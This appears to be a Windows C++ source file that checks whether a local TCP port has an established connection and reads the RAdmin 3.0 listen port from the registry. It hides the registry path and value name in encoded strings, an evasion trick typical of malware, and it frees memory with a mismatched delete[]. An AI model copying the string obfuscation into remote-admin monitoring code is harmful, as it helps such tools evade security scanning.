// tcpmonitor.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

DWORD IsPortConnected(WORD wPort){
	PMIB_TCPTABLE pTcpTable = new MIB_TCPTABLE;
	DWORD dwSize = sizeof(MIB_TCPTABLE), dwRetVal=0, dwRet=FALSE;
	in_addr addrLocal, addrRemote;
	int i;

	if(!wPort) goto Cleanup;

    if ((dwRetVal = GetTcpTable(pTcpTable, &dwSize, TRUE)) ==
        ERROR_INSUFFICIENT_BUFFER) {
        delete pTcpTable;
        pTcpTable = (MIB_TCPTABLE *) new BYTE[dwSize];
        if (pTcpTable == NULL)
            return -1;
		//memset(pTcpTable, 0, dwSize);
    }
	else{
		if(dwRetVal != NO_ERROR){
			delete pTcpTable;
			return -1;
		}
	}

	if ((dwRetVal = GetTcpTable(pTcpTable, &dwSize, TRUE)) == NO_ERROR) {
        for (i = 0; i < (int) pTcpTable->dwNumEntries; i++) {

			addrLocal.S_un.S_addr = pTcpTable->table[i].dwLocalAddr;
			addrRemote.S_un.S_addr = pTcpTable->table[i].dwRemoteAddr;

			if(ntohs(pTcpTable->table[i].dwLocalPort) == wPort 
				&& pTcpTable->table[i].dwState == MIB_TCP_STATE_ESTAB){
				dwRet = TRUE;
				goto Cleanup;
			}
		}
		dwRet = FALSE;
	}
	else{
		dwRet = -1;
		goto Cleanup;
	}

Cleanup:
	if(pTcpTable) 
		delete[] pTcpTable;

	return dwRet;
}


//RAdmin 3.0 Default Port = 4899
DWORD GetRAdminListenPort(void){
	HKEY hKey=NULL;
	DWORD dwValueType = REG_BINARY, dwcbOutBuffer = sizeof(DWORD);
	DWORD dwPort = NULL;
	DecodeString ds;

	if(RegOpenKey(HKEY_LOCAL_MACHINE, 
		ds.getDecodeString((LPSTR)encStr_SOFTWARE_Radmin_v30_Server_Parameters), &hKey) != ERROR_SUCCESS){
		goto Cleanup;
	}

	if(RegQueryValueEx(hKey, ds.getDecodeString((LPSTR)encStr_Port), NULL, &dwValueType, 
		(LPBYTE)&dwPort, &dwcbOutBuffer) != ERROR_SUCCESS){
		dwPort = NULL;
		goto Cleanup;
	}

Cleanup:
	if(hKey)
		RegCloseKey(hKey);

	return dwPort;
}

